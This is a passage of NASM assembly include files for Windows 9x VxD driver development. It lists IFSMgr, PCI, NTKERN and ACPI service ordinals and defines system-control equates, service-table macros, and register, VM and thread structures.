  IFSMgr_Service IFSMgr_Yield                             ; 0x0014 ord
  IFSMgr_Service IFSMgr_SchedEvent                        ; 0x0015 ord
  IFSMgr_Service IFSMgr_QueueEvent                        ; 0x0016 ord
  IFSMgr_Service IFSMgr_KillEvent                         ; 0x0017 ord
  IFSMgr_Service IFSMgr_FreeIOReq                         ; 0x0018 ord
  IFSMgr_Service IFSMgr_MakeMailSlot                      ; 0x0019 ord
  IFSMgr_Service IFSMgr_DeleteMailSlot                    ; 0x001a ord
  IFSMgr_Service IFSMgr_WriteMailSlot                     ; 0x001b ord
  IFSMgr_Service IFSMgr_PopUp                             ; 0x001c ord
  IFSMgr_Service IFSMgr_printf                            ; 0x001d ord
  IFSMgr_Service IFSMgr_AssertFailed                      ; 0x001e ord
  IFSMgr_Service IFSMgr_LogEntry                          ; 0x001f ord
  IFSMgr_Service IFSMgr_DebugMenu                         ; 0x0020 ord
  IFSMgr_Service IFSMgr_DebugVars                         ; 0x0021 ord
  IFSMgr_Service IFSMgr_GetDebugString                    ; 0x0022 ord
  IFSMgr_Service IFSMgr_GetDebugHexNum                    ; 0x0023 ord
  IFSMgr_Service IFSMgr_NetFunction                       ; 0x0024 ord
  IFSMgr_Service IFSMgr_DoDelAllUses                      ; 0x0025 ord
  IFSMgr_Service IFSMgr_SetErrString                      ; 0x0026 ord
  IFSMgr_Service IFSMgr_GetErrString                      ; 0x0027 ord
  IFSMgr_Service IFSMgr_SetReqHook                        ; 0x0028 ord
  IFSMgr_Service IFSMgr_SetPathHook                       ; 0x0029 ord
  IFSMgr_Service IFSMgr_UseAdd                            ; 0x002a ord
  IFSMgr_Service IFSMgr_UseDel                            ; 0x002b ord
  IFSMgr_Service IFSMgr_InitUseAdd                        ; 0x002c ord
  IFSMgr_Service IFSMgr_ChangeDir                         ; 0x002d ord
  IFSMgr_Service IFSMgr_DelAllUses                        ; 0x002e ord
  IFSMgr_Service IFSMgr_CDROM_Attach                      ; 0x002f ord
  IFSMgr_Service IFSMgr_CDROM_Detach                      ; 0x0030 ord
  IFSMgr_Service IFSMgr_Win32DupHandle                    ; 0x0031 ord
  IFSMgr_Service IFSMgr_Ring0_FileIO                      ; 0x0032 ord
  IFSMgr_Service IFSMgr_Win32_Get_Ring0_Handle            ; 0x0033 ord
  IFSMgr_Service IFSMgr_Get_Drive_Info                    ; 0x0034 ord
  IFSMgr_Service IFSMgr_Ring0GetDriveInfo                 ; 0x0035 ord
  IFSMgr_Service IFSMgr_BlockNoEvents                     ; 0x0036 ord
  IFSMgr_Service IFSMgr_NetToDosTime                      ; 0x0037 ord
  IFSMgr_Service IFSMgr_DosToNetTime                      ; 0x0038 ord
  IFSMgr_Service IFSMgr_DosToWin32Time                    ; 0x0039 ord
  IFSMgr_Service IFSMgr_Win32ToDosTime                    ; 0x003a ord
  IFSMgr_Service IFSMgr_NetToWin32Time                    ; 0x003b ord
  IFSMgr_Service IFSMgr_Win32ToNetTime                    ; 0x003c ord
  IFSMgr_Service IFSMgr_MetaMatch                         ; 0x003d ord
  IFSMgr_Service IFSMgr_TransMatch                        ; 0x003e ord
  IFSMgr_Service IFSMgr_CallProvider                      ; 0x003f ord
  IFSMgr_Service UniToBCS                                 ; 0x0040 ord
  IFSMgr_Service UniToBCSPath                             ; 0x0041 ord
  IFSMgr_Service BCSToUni                                 ; 0x0042 ord
  IFSMgr_Service UniToUpper                               ; 0x0043 ord
  IFSMgr_Service UniCharToOEM                             ; 0x0044 ord
  IFSMgr_Service CreateBasis                              ; 0x0045 ord
  IFSMgr_Service MatchBasisName                           ; 0x0046 ord
  IFSMgr_Service AppendBasisTail                          ; 0x0047 ord
  IFSMgr_Service FcbToShort                               ; 0x0048 ord
  IFSMgr_Service ShortToFcb                               ; 0x0049 ord
  IFSMgr_Service IFSMgr_ParsePath                         ; 0x004a ord
  IFSMgr_Service Query_PhysLock                           ; 0x004b ord
  IFSMgr_Service _VolFlush                                ; 0x004c ord
  IFSMgr_Service NotifyVolumeArrival                      ; 0x004d ord
  IFSMgr_Service NotifyVolumeRemoval                      ; 0x004e ord
  IFSMgr_Service QueryVolumeRemoval                       ; 0x004f ord
  IFSMgr_Service IFSMgr_FSDUnmountCFSD                    ; 0x0050 ord
  IFSMgr_Service IFSMgr_GetConversionTablePtrs            ; 0x0051 ord
  IFSMgr_Service IFSMgr_CheckAccessConflict               ; 0x0052 ord
  IFSMgr_Service IFSMgr_LockFile                          ; 0x0053 ord
  IFSMgr_Service IFSMgr_UnlockFile                        ; 0x0054 ord
  IFSMgr_Service IFSMgr_RemoveLocks                       ; 0x0055 ord
  IFSMgr_Service IFSMgr_CheckLocks                        ; 0x0056 ord
  IFSMgr_Service IFSMgr_CountLocks                        ; 0x0057 ord
  IFSMgr_Service IFSMgr_ReassignLockFileInst              ; 0x0058 ord
  IFSMgr_Service IFSMgr_UnassignLockList                  ; 0x0059 ord
  IFSMgr_Service IFSMgr_MountChildVolume                  ; 0x005a ord
  IFSMgr_Service IFSMgr_UnmountChildVolume                ; 0x005b ord
  IFSMgr_Service IFSMgr_SwapDrives                        ; 0x005c ord
  IFSMgr_Service IFSMgr_FSDMapFHtoIOREQ                   ; 0x005d ord
  IFSMgr_Service IFSMgr_FSDParsePath                      ; 0x005e ord
  IFSMgr_Service IFSMgr_FSDAttachSFT                      ; 0x005f ord
  IFSMgr_Service IFSMgr_GetTimeZoneBias                   ; 0x0060 ord
  IFSMgr_Service IFSMgr_PNPEvent                          ; 0x0061 ord
  IFSMgr_Service IFSMgr_RegisterCFSD                      ; 0x0062 ord
  IFSMgr_Service IFSMgr_Win32MapExtendedHandleToSFT       ; 0x0063 ord
  IFSMgr_Service IFSMgr_DbgSetFileHandleLimit             ; 0x0064 ord
  IFSMgr_Service IFSMgr_Win32MapSFTToExtendedHandle       ; 0x0065 ord
  IFSMgr_Service IFSMgr_FSDGetCurrentDrive                ; 0x0066 ord
  IFSMgr_Service IFSMgr_InstallFileSystemApiHook          ; 0x0067 ord
  IFSMgr_Service IFSMgr_RemoveFileSystemApiHook           ; 0x0068 ord
  IFSMgr_Service IFSMgr_RunScheduledEvents                ; 0x0069 ord
  IFSMgr_Service IFSMgr_CheckDelResource                  ; 0x006a ord
  IFSMgr_Service IFSMgr_Win32GetVMCurdir                  ; 0x006b ord
  IFSMgr_Service IFSMgr_SetupFailedConnection             ; 0x006c ord
  IFSMgr_Service _GetMappedErr                            ; 0x006d ord
  IFSMgr_Service ShortToLossyFcb                          ; 0x006e ord
  IFSMgr_Service IFSMgr_GetLockState                      ; 0x006f ord
  IFSMgr_Service BcsToBcs                                 ; 0x0070 ord
  IFSMgr_Service IFSMgr_SetLoopback                       ; 0x0071 ord
  IFSMgr_Service IFSMgr_ClearLoopback                     ; 0x0072 ord
  IFSMgr_Service IFSMgr_ParseOneElement                   ; 0x0073 ord
  IFSMgr_Service BcsToBcsUpper                            ; 0x0074 ord
  IFSMgr_Service IFSMgr_DeregisterFSD                     ; 0x0075 ord
  IFSMgr_Service IFSMgr_RegisterFSDWithPriority           ; 0x0076 ord
  IFSMgr_Service IFSMgr_Get_DOSTimeRounded                ; 0x0077 ord
  IFSMgr_Service _LongToFcbOem                            ; 0x0078 ord
  IFSMgr_Service IFSMgr_GetRing0FileHandle                ; 0x0079 ord
  IFSMgr_Service IFSMgr_UpdateTimezoneInfo                ; 0x007a ord
  IFSMgr_Service IFSMgr_Ring0IsCPSingleByte               ; 0x007b ord
End_Service_Table IFSMgr

Begin_Service_Table VCDFSD	; 0x0041
End_Service_Table VCDFSD

Begin_Service_Table MRCI2	; 0x0042
End_Service_Table MRCI2

Begin_Service_Table PCI	; 0x0043
  PCI_Service _PCI_Get_Version                         ; 0x0000 ord
  PCI_Service _PCI_Read_Config                         ; 0x0001 ord
  PCI_Service _PCI_Write_Config                        ; 0x0002 ord
  PCI_Service _PCI_Lock_Unlock                         ; 0x0003 ord
End_Service_Table PCI

Begin_Service_Table PELOADER	; 0x0044
End_Service_Table PELOADER

Begin_Service_Table EISA	; 0x0045
End_Service_Table EISA

Begin_Service_Table DRAGCLI	; 0x0046
End_Service_Table DRAGCLI

Begin_Service_Table DRAGSRV	; 0x0047
End_Service_Table DRAGSRV

Begin_Service_Table PERF	; 0x0048
End_Service_Table PERF

Begin_Service_Table AWREDIR	; 0x0049
End_Service_Table AWREDIR

Begin_Service_Table DDS	; 0x004a
End_Service_Table DDS

Begin_Service_Table NTKERN	; 0x004b
  NTKERN_Service _NTKERN_Get_Version                      ; 0x0000 ord
  NTKERN_Service _NtKernCreateFile                        ; 0x0001 ord
  NTKERN_Service _NtKernClose                             ; 0x0002 ord
  NTKERN_Service _NtKernReadFile                          ; 0x0003 ord
  NTKERN_Service _NtKernWriteFile                         ; 0x0004 ord
  NTKERN_Service _NtKernDeviceIoControl                   ; 0x0005 ord
  NTKERN_Service _NtKernGetWorkerThread                   ; 0x0006 ord
  NTKERN_Service _NtKernLoadDriver                        ; 0x0007 ord
  NTKERN_Service _NtKernQueueWorkItem                     ; 0x0008 ord
  NTKERN_Service _NtKernPhysicalDeviceObjectToDevNode     ; 0x0009 ord
  NTKERN_Service _NtKernSetPhysicalCacheTypeRange         ; 0x000a ord
  NTKERN_Service _NtKernWin9XLoadDriver                   ; 0x000b ord
  NTKERN_Service _NtKernCancelIoFile                      ; 0x000c ord
  NTKERN_Service _NtKernGetVPICDHandleFromInterruptObj    ; 0x000d ord
  NTKERN_Service _NtKernInternalDeviceIoControl           ; 0x000e ord
End_Service_Table NTKERN

Begin_Service_Table VDOSKEYD	; 0x004b
End_Service_Table VDOSKEYD

Begin_Service_Table ACPI	; 0x004c
  ACPI_Service ACPI_GetVersion                          ; 0x0000 ord
  ACPI_Service _ACPI_SetSystemPowerState                ; 0x0001 ord
  ACPI_Service _ACPI_SetTimingMode                      ; 0x0002 ord
  ACPI_Service _ACPI_RegisterOpRegionCookedHandler      ; 0x0003 ord
  ACPI_Service _ACPI_Set_RTC                            ; 0x0004 ord
  ACPI_Service _ACPI_GetTimingMode                      ; 0x0005 ord
  ACPI_Service _ACPI_GetTaskFile                        ; 0x0006 ord
  ACPI_Service _ACPI_WalkNameSpace                      ; 0x0007 ord
  ACPI_Service _ACPI_GetObject                          ; 0x0008 ord
  ACPI_Service _ACPI_NameSpaceToDevNode                 ; 0x0009 ord
  ACPI_Service _ACPI_DevNodeToNameSpace                 ; 0x000a ord
  ACPI_Service _ACPI_RunControlMethod                   ; 0x000b ord
  ACPI_Service _ACPI_PrepareForSleeping                 ; 0x000c ord
  ACPI_Service _ACPI_PrepareForResume                   ; 0x000d ord
  ACPI_Service _ACPI_SystemShutdown                     ; 0x000e ord
  ACPI_Service _ACPI_EvalPackageElement                 ; 0x000f ord
  ACPI_Service _ACPI_EvalPkgDataElement                 ; 0x0010 ord
  ACPI_Service _ACPI_FreeDataBuffs                      ; 0x0011 ord
  ACPI_Service _ACPI_GetRootSystemDescriptorTable       ; 0x0012 ord
  ACPI_Service _ACPI_Get_RTC                            ; 0x0013 ord
  ACPI_Service _ACPI_GetNameSpaceObject                 ; 0x0014 ord
  ACPI_Service _ACPI_IdentifyDebuggerCommInfo           ; 0x0015 ord
  ACPI_Service _ACPI_SetTimingModeEx                    ; 0x0016 ord
  ACPI_Service _ACPI_GetTimingModeEx                    ; 0x0017 ord
  ACPI_Service _ACPI_GetIDEPMComplianceLevel            ; 0x0018 ord
  ACPI_Service _ACPI_FreeTaskFileBuffer                 ; 0x0019 ord
  ACPI_Service _ACPI_ResumeComplete                     ; 0x001a ord
End_Service_Table ACPI

Begin_Service_Table UDF	; 0x004d
End_Service_Table UDF

Begin_Service_Table SMCLIB	; 0x004e
End_Service_Table SMCLIB

Begin_Service_Table ETEN	; 0x0060
End_Service_Table ETEN

Begin_Service_Table CHBIOS	; 0x0061
End_Service_Table CHBIOS

Begin_Service_Table VMSGD	; 0x0062
End_Service_Table VMSGD

Begin_Service_Table VPPID	; 0x0063
End_Service_Table VPPID

Begin_Service_Table VIME	; 0x0064
End_Service_Table VIME

Begin_Service_Table VHBIOSD	; 0x0065
End_Service_Table VHBIOSD

%endif ; INCLUDED_WINDDK_INC__
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WINDDK.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[VXDN.INC]컴�
;////////////////////////////////////////////////////////////
;// vxdn.inc
;//
;// VxD definitions for NASM
;//
;// Collective effort of fOSSiL and The Owl =)
;//
;// 06-Aug-1999	fOSSiL		Initial version
;// 16-Jan-2000 The Owl		bunch of structs and equates
;// 16-Jan-2000 fOSSiL		Separated Auto-generated stuff from hand-made, better MASM-compat
;// 18-Jan-2000 The Owl		modified DDB builder macro

%ifndef INCLUDED_VXDN_INC
%define INCLUDED_VXDN_INC

DDK_VERSION		EQU 0x0400
UNDEFINED_DEVICE_ID	EQU 0x0000
UNDEFINED_INIT_ORDER	EQU 0x80000000

SYS_CRITICAL_INIT	EQU 0000H
DEVICE_INIT		EQU 0001H
INIT_COMPLETE		EQU 0002H
SYS_VM_INIT		EQU 0003H
SYS_VM_TERMINATE	EQU 0004H
SYSTEM_EXIT		EQU 0005H
SYS_CRITICAL_EXIT	EQU 0006H
CREATE_VM		EQU 0007H
VM_CRITICAL_INIT	EQU 0008H
VM_INIT			EQU 0009H
VM_TERMINATE		EQU 000AH
VM_NOT_EXECUTEABLE	EQU 000BH
DESTROY_VM		EQU 000CH

VNE_CRASHED_BIT		EQU 00H
VNE_CRASHED		EQU (1 << VNE_CRASHED_BIT)
VNE_NUKED_BIT		EQU 01H
VNE_NUKED		EQU (1 << VNE_NUKED_BIT)
VNE_CREATEFAIL_BIT	EQU 02H
VNE_CREATEFAIL		EQU (1 << VNE_CREATEFAIL_BIT)
VNE_CRINITFAIL_BIT	EQU 03H
VNE_CRINITFAIL		EQU (1 << VNE_CRINITFAIL_BIT)
VNE_INITFAIL_BIT	EQU 04H
VNE_INITFAIL		EQU (1 << VNE_INITFAIL_BIT)
VNE_CLOSED_BIT		EQU 05H
VNE_CLOSED		EQU (1 << VNE_CLOSED_BIT)

VM_SUSPEND		EQU 000DH
VM_RESUME		EQU 000EH
SET_DEVICE_FOCUS	EQU 000FH
BEGIN_MESSAGE_MODE	EQU 0010H
END_MESSAGE_MODE	EQU 0011H
REBOOT_PROCESSOR	EQU 0012H
QUERY_DESTROY		EQU 0013H
DEBUG_QUERY		EQU 0014H
BEGIN_PM_APP		EQU 0015H

BPA_32_BIT		EQU 01H
BPA_32_BIT_FLAG		EQU 1

END_PM_APP		EQU 0016H
DEVICE_REBOOT_NOTIFY	EQU 0017H
CRIT_REBOOT_NOTIFY	EQU 0018H
CLOSE_VM_NOTIFY		EQU 0019H
POWER_EVENT		EQU 001AH
SYS_DYNAMIC_DEVICE_INIT	EQU 001BH
SYS_DYNAMIC_DEVICE_EXIT	EQU 001CH
CREATE_THREAD		EQU 001DH
THREAD_INIT		EQU 001EH
TERMINATE_THREAD	EQU 001FH
THREAD_NOT_EXECUTEABLE	EQU 0020H
DESTROY_THREAD		EQU 0021H
PNP_NEW_DEVNODE		EQU 0022H
W32_DEVICEIOCONTROL	EQU 0023H

DIOC_GETVERSION		EQU 0H
DIOC_OPEN		EQU DIOC_GETVERSION
DIOC_CLOSEHANDLE	EQU -1

SYS_VM_TERMINATE2	EQU 0024H
SYSTEM_EXIT2		EQU 0025H
SYS_CRITICAL_EXIT2	EQU 0026H
VM_TERMINATE2		EQU 0027H
VM_NOT_EXECUTEABLE2	EQU 0028H
DESTROY_VM2		EQU 0029H
VM_SUSPEND2		EQU 002AH
END_MESSAGE_MODE2	EQU 002BH
END_PM_APP2		EQU 002CH
DEVICE_REBOOT_NOTIFY2	EQU 002DH
CRIT_REBOOT_NOTIFY2	EQU 002EH
CLOSE_VM_NOTIFY2	EQU 002FH
GET_CONTENTION_HANDLER	EQU 0030H
KERNEL32_INITIALIZED	EQU 0031H
KERNEL32_SHUTDOWN	EQU 0032H
CREATE_PROCESS		EQU 0033H
DESTROY_PROCESS		EQU 0034H
SYS_DYNAMIC_DEVICE_REINIT	EQU 0035H
SYS_POWER_DOWN		EQU 0036H
MAX_SYSTEM_CONTROL	EQU 0036H

BEGIN_RESERVED_PRIVATE_SYSTEM_CONTROL	EQU 70000000H
END_RESERVED_PRIVATE_SYSTEM_CONTROL	EQU 7FFFFFFFH


%macro VxD_Service 2
  @@%2 EQU (%1_Device_ID << 16) | __Cur_Service_Num__
  %assign __Cur_Service_Num__ (__Cur_Service_Num__ + 1)
  %ifdef Create_Service_Table_%1
    dd %2
  %endif
%endmacro

%macro Begin_Service_Table 1
  %assign __Cur_Service_Num__ 0
  %define %1_Service VxD_Service %1,

  %ifdef Create_Service_Table_%1
[segment _LDATA]
    %1_Service_Table:
  %endif
%endmacro

%macro End_Service_Table 1
  Num_%1_Services equ __Cur_Service_Num__
  %undef __Cur_Service_Num__
  %undef %1_Service
  %ifdef Create_Service_Table_%1
__SECT__
  %endif
%endmacro


%include "winddk.inc"


; Client Register Structure as passed to V86/PM CallBacks
struc CRS
.EDI		resd 1		; 0
.ESI		resd 1		; 4
.EBP		resd 1		; 8
.res0		resd 1		; C
.EBX		resd 1		; 10
.EDX		resd 1		; 14
.ECX		resd 1		; 18
.EAX		resd 1		; 1C
.Error		resd 1		; 20
.EIP		resd 1		; 24
.CS		resw 1		; 28
.res1		resw 1		;
.EFlags		resd 1		; 2C
.ESP		resd 1		; 30
.SS		resw 1		; 34
.res2		resw 1
.ES		resw 1		; 38
.res3		resw 1
.DS		resw 1		; 3C		
.res4		resw 1
.FS		resw 1		; 40
.res5		resw 1
.GS		resw 1		; 44
.res6		resw 1
.Alt_EIP	resd 1		; 48
.Alt_CS		resw 1		; 4C
.res7		resw 1
.Alt_EFlags	resd 1
.Alt_ESP	resd 1
.Alt_SS		resw 1
.res8		resw 1
.Alt_ES		resw 1
.res9		resw 1
.Alt_DS		resw 1
.res10		resw 1
.Alt_FS		resw 1
.res11		resw 1
.Alt_GS		resw 1
.res12		resw 1
endstruc

struc cb_s
CB_VM_Status		resd 1
CB_High_Linear		resd 1
CB_Client_Pointer	resd 1
CB_VMID			resd 1
CB_Signature		resd 1
endstruc

VMCB_ID				EQU	62634D56H
VMSTAT_EXCLUSIVE_BIT		EQU	00H
VMSTAT_EXCLUSIVE		EQU	(1 << VMSTAT_EXCLUSIVE_BIT)
VMSTAT_BACKGROUND_BIT		EQU	01H
VMSTAT_BACKGROUND		EQU	(1 << VMSTAT_BACKGROUND_BIT)
VMSTAT_CREATING_BIT		EQU	02H
VMSTAT_CREATING			EQU	(1 << VMSTAT_CREATING_BIT)
VMSTAT_SUSPENDED_BIT		EQU	03H
VMSTAT_SUSPENDED		EQU	(1 << VMSTAT_SUSPENDED_BIT)
VMSTAT_NOT_EXECUTEABLE_BIT	EQU	04H
VMSTAT_NOT_EXECUTEABLE		EQU	(1 << VMSTAT_NOT_EXECUTEABLE_BIT)
VMSTAT_PM_EXEC_BIT		EQU	05H
VMSTAT_PM_EXEC			EQU	(1 << VMSTAT_PM_EXEC_BIT)
VMSTAT_PM_APP_BIT		EQU	06H
VMSTAT_PM_APP			EQU	(1 << VMSTAT_PM_APP_BIT)
VMSTAT_PM_USE32_BIT		EQU	07H
VMSTAT_PM_USE32			EQU	(1 << VMSTAT_PM_USE32_BIT)
VMSTAT_VXD_EXEC_BIT		EQU	08H
VMSTAT_VXD_EXEC			EQU	(1 << VMSTAT_VXD_EXEC_BIT)
VMSTAT_HIGH_PRI_BACK_BIT	EQU	09H
VMSTAT_HIGH_PRI_BACK		EQU	(1 << VMSTAT_HIGH_PRI_BACK_BIT)
VMSTAT_BLOCKED_BIT		EQU	0AH
VMSTAT_BLOCKED			EQU	(1 << VMSTAT_BLOCKED_BIT)
VMSTAT_AWAKENING_BIT		EQU	0BH
VMSTAT_AWAKENING		EQU	(1 << VMSTAT_AWAKENING_BIT)
VMSTAT_PAGEABLEV86BIT		EQU	0CH
VMSTAT_PAGEABLEV86_BIT		EQU	VMSTAT_PAGEABLEV86BIT
VMSTAT_PAGEABLEV86		EQU	(1 << VMSTAT_PAGEABLEV86BIT)
VMSTAT_V86INTSLOCKEDBIT		EQU	0DH
VMSTAT_V86INTSLOCKED_BIT	EQU	VMSTAT_V86INTSLOCKEDBIT
VMSTAT_V86INTSLOCKED		EQU	(1 << VMSTAT_V86INTSLOCKEDBIT)
VMSTAT_IDLE_TIMEOUT_BIT		EQU	0EH
VMSTAT_IDLE_TIMEOUT		EQU	(1 << VMSTAT_IDLE_TIMEOUT_BIT)
VMSTAT_IDLE_BIT			EQU	0FH
VMSTAT_IDLE			EQU	(1 << VMSTAT_IDLE_BIT)
VMSTAT_CLOSING_BIT		EQU	10H
VMSTAT_CLOSING			EQU	(1 << VMSTAT_CLOSING_BIT)
VMSTAT_TS_SUSPENDED_BIT		EQU	11H
VMSTAT_TS_SUSPENDED		EQU	(1 << VMSTAT_TS_SUSPENDED_BIT)
VMSTAT_TS_MAXPRI_BIT		EQU	12H
VMSTAT_TS_MAXPRI		EQU	(1 << VMSTAT_TS_MAXPRI_BIT)
VMSTAT_USE32_MASK		EQU	(VMSTAT_PM_USE32 | VMSTAT_VXD_EXEC)

struc tcb_s
TCB_Flags		resd 1 ; 00
TCB_Reserved1		resd 1 ; 04
TCB_Reserved2		resd 1 ; 08
TCB_Signature		resd 1 ; 0C
TCB_ClientPtr		resd 1 ; 10
TCB_VMHandle		resd 1 ; 14
TCB_ThreadId		resw 1 ; 18
TCB_PMLockOrigSS	resw 1 ; 1A
TCB_PMLockOrigESP	resd 1 ; 1C
TCB_PMLockOrigEIP	resd 1 ; 20
TCB_PMLockStackCount	resd 1 ; 24
TCB_PMLockOrigCS	resw 1 ; 28
TCB_PMPSPSelector	resw 1 ; 2A
TCB_ThreadType		resd 1 ; 2C
TCB_pad1		resw 1 ;
TCB_pad2		resb 1 ;
TCB_extErrLocus		resb 1 ;
TCB_extErr		resw 1 ;
TCB_extErrAction	resb 1 ;
TCB_extErrClass		resb 1 ;
TCB_extErrPtr		resd 1 ;
endstruc

SCHED_OBJ_ID_THREAD		EQU	42434854H
THFLAG_SUSPENDED_BIT		EQU	03H
THFLAG_SUSPENDED		EQU	(1 << THFLAG_SUSPENDED_BIT)
THFLAG_NOT_EXECUTEABLE_BIT	EQU	04H
THFLAG_NOT_EXECUTEABLE		EQU	(1 << THFLAG_NOT_EXECUTEABLE_BIT)
THFLAG_THREAD_CREATION_BIT	EQU	08H
THFLAG_THREAD_CREATION		EQU	(1 << THFLAG_THREAD_CREATION_BIT)
THFLAG_THREAD_BLOCKED_BIT	EQU	0AH
THFLAG_THREAD_BLOCKED		EQU	(1 << THFLAG_THREAD_BLOCKED_BIT)
THFLAG_RING0_THREAD_BIT		EQU	1CH
THFLAG_RING0_THREAD		EQU	(1 << THFLAG_RING0_THREAD_BIT)
THFLAG_ASYNC_THREAD_BIT		EQU	1FH
THFLAG_ASYNC_THREAD		EQU	(1 << THFLAG_ASYNC_THREAD_BIT)
THFLAG_CHARSET_BITS		EQU	10H
THFLAG_CHARSET_MASK		EQU	(3 << THFLAG_CHARSET_BITS)
THFLAG_ANSI			EQU	(0 << THFLAG_CHARSET_BITS)
THFLAG_OEM			EQU	(1 << THFLAG_CHARSET_BITS)
THFLAG_UNICODE			EQU	(2 << THFLAG_CHARSET_BITS)
THFLAG_RESERVED			EQU	(3 << THFLAG_CHARSET_BITS)
THFLAG_EXTENDED_HANDLES_BIT	EQU	12H
THFLAG_EXTENDED_HANDLES		EQU	(1 << THFLAG_EXTENDED_HANDLES_BIT)
THFLAG_OPEN_AS_IMMOVABLE_FILE_BIT	EQU	13H
THFLAG_OPEN_AS_IMMOVABLE_FILE	EQU	(1 << THFLAG_OPEN_AS_IMMOVABLE_FILE_BIT)

struc pmcb_s
PMCB_Flags	resd 1
PMCB_Parent	resd 1
endstruc

struc Exception_Handler_Struc
EHS_Reserved	resd 1
EHS_Start_EIP	resd 1
EHS_End_EIP	resd 1
EHS_Handler	resd 1
endstruc

struc VMFaultInfo
VMFI_EIP	resd 1
VMFI_CS		resw 1
VMFI_Ints	resw 1
endstruc
 
RESERVED_LOW_BOOST		EQU	00000001H
CUR_RUN_VM_BOOST		EQU	00000004H
LOW_PRI_DEVICE_BOOST		EQU	00000010H
HIGH_PRI_DEVICE_BOOST		EQU	00001000H
CRITICAL_SECTION_BOOST		EQU	00100000H
TIME_CRITICAL_BOOST		EQU	00400000H
RESERVED_HIGH_BOOST		EQU	40000000H
PEF_WAIT_FOR_STI_BIT		EQU	0
PEF_WAIT_FOR_STI		EQU	(1 << PEF_WAIT_FOR_STI_BIT)
PEF_WAIT_NOT_CRIT_BIT		EQU	1
PEF_WAIT_NOT_CRIT		EQU	(1 << PEF_WAIT_NOT_CRIT_BIT)
PEF_DONT_UNBOOST_BIT		EQU	2
PEF_DONT_UNBOOST		EQU	(1 << PEF_DONT_UNBOOST_BIT)
PEF_ALWAYS_SCHED_BIT		EQU	3
PEF_ALWAYS_SCHED		EQU	(1 << PEF_ALWAYS_SCHED_BIT)
PEF_TIME_OUT_BIT		EQU	4
PEF_TIME_OUT			EQU	(1 << PEF_TIME_OUT_BIT)
PEF_WAIT_NOT_HW_INT_BIT		EQU	5
PEF_WAIT_NOT_HW_INT		EQU	(1 << PEF_WAIT_NOT_HW_INT_BIT)
PEF_WAIT_NOT_NESTED_EXEC_BIT	EQU	6
PEF_WAIT_NOT_NESTED_EXEC	EQU	(1 << PEF_WAIT_NOT_NESTED_EXEC_BIT)
PEF_WAIT_IN_PM_BIT		EQU	7
PEF_WAIT_IN_PM			EQU	(1 << PEF_WAIT_IN_PM_BIT)
PEF_THREAD_EVENT_BIT		EQU	8
PEF_THREAD_EVENT		EQU	(1 << PEF_THREAD_EVENT_BIT)
PEF_WAIT_FOR_THREAD_STI_BIT	EQU	9
PEF_WAIT_FOR_THREAD_STI		EQU	(1 << PEF_WAIT_FOR_THREAD_STI_BIT)
PEF_RING0_EVENT_BIT		EQU	10
PEF_RING0_EVENT			EQU	(1 << PEF_RING0_EVENT_BIT)
PEF_WAIT_CRIT_BIT		EQU	11
PEF_WAIT_CRIT			EQU	(1 << PEF_WAIT_CRIT_BIT)
PEF_WAIT_CRIT_VM_BIT		EQU	12
PEF_WAIT_CRIT_VM		EQU	(1 << PEF_WAIT_CRIT_VM_BIT)
PEF_PROCESS_LAST_BIT		EQU	13
PEF_PROCESS_LAST		EQU	(1 << PEF_PROCESS_LAST_BIT)
PEF_WAIT_PREEMPTABLE_BIT	EQU	14
PEF_WAIT_PREEMPTABLE		EQU	(1 << PEF_WAIT_PREEMPTABLE_BIT)
PEF_WAIT_FOR_PASSIVE_BIT	EQU	15
PEF_WAIT_FOR_PASSIVE		EQU	(1 << PEF_WAIT_FOR_PASSIVE_BIT)
PEF_WAIT_FOR_APPY_BIT		EQU	16
PEF_WAIT_FOR_APPY		EQU	(1 << PEF_WAIT_FOR_APPY_BIT)
PEF_WAIT_FOR_WORKER_BIT		EQU	17
PEF_WAIT_FOR_WORKER		EQU	(1 << PEF_WAIT_FOR_WORKER_BIT)
PEF_WAIT_NOT_TIME_CRIT_BIT	EQU	PEF_WAIT_NOT_HW_INT_BIT
PEF_WAIT_NOT_TIME_CRIT		EQU	PEF_WAIT_NOT_HW_INT
PEF_WAIT_NOT_PM_LOCKED_STACK_BIT	EQU	PEF_WAIT_NOT_NESTED_EXEC_BIT
PEF_WAIT_NOT_PM_LOCKED_STACK	EQU	PEF_WAIT_NOT_NESTED_EXEC
PEF_WAIT_FOR_CONFIGMG_CALLABLE	EQU	PEF_WAIT_FOR_WORKER
PEF_WAIT_FOR_CONFIGMG_QUICK	EQU	PEF_WAIT_FOR_APPY
BLOCK_SVC_INTS_BIT		EQU	0
BLOCK_SVC_INTS			EQU	(1 << BLOCK_SVC_INTS_BIT)
BLOCK_SVC_IF_INTS_LOCKED_BIT	EQU	1
BLOCK_SVC_IF_INTS_LOCKED	EQU	(1 << BLOCK_SVC_IF_INTS_LOCKED_BIT)
BLOCK_ENABLE_INTS_BIT		EQU	2
BLOCK_ENABLE_INTS		EQU	(1 << BLOCK_ENABLE_INTS_BIT)
BLOCK_POLL_BIT			EQU	3
BLOCK_POLL			EQU	(1 << BLOCK_POLL_BIT)
BLOCK_THREAD_IDLE_BIT		EQU	4
BLOCK_THREAD_IDLE		EQU	(1 << BLOCK_THREAD_IDLE_BIT)
BLOCK_FORCE_SVC_INTS_BIT	EQU	5
BLOCK_FORCE_SVC_INTS		EQU	(1 << BLOCK_FORCE_SVC_INTS_BIT)

PAGEZEROINIT		EQU	00000001H
PAGEUSEALIGN		EQU	00000002H
PAGECONTIG		EQU	00000004H
PAGEFIXED		EQU	00000008H
PAGEDEBUGNULFAULT	EQU	00000010H
PAGEZEROREINIT		EQU	00000020H
PAGENOCOPY		EQU	00000040H
PAGELOCKED		EQU	00000080H
PAGELOCKEDIFDP		EQU	00000100H
PAGESETV86PAGEABLE	EQU	00000200H
PAGECLEARV86PAGEABLE	EQU	00000400H
PAGESETV86INTSLOCKED	EQU	00000800H
PAGECLEARV86INTSLOCKED	EQU	00001000H
PAGEMARKPAGEOUT		EQU	00002000H
PAGEPDPSETBASE		EQU	00004000H
PAGEPDPCLEARBASE	EQU	00008000H
PAGEDISCARD		EQU	00010000H
PAGEPDPQUERYDIRTY	EQU	00020000H
PAGEMAPFREEPHYSREG	EQU	00040000H
PAGEPHYSONLY		EQU	04000000H
PAGENOMOVE		EQU	10000000H
PAGEMAPGLOBAL		EQU	40000000H
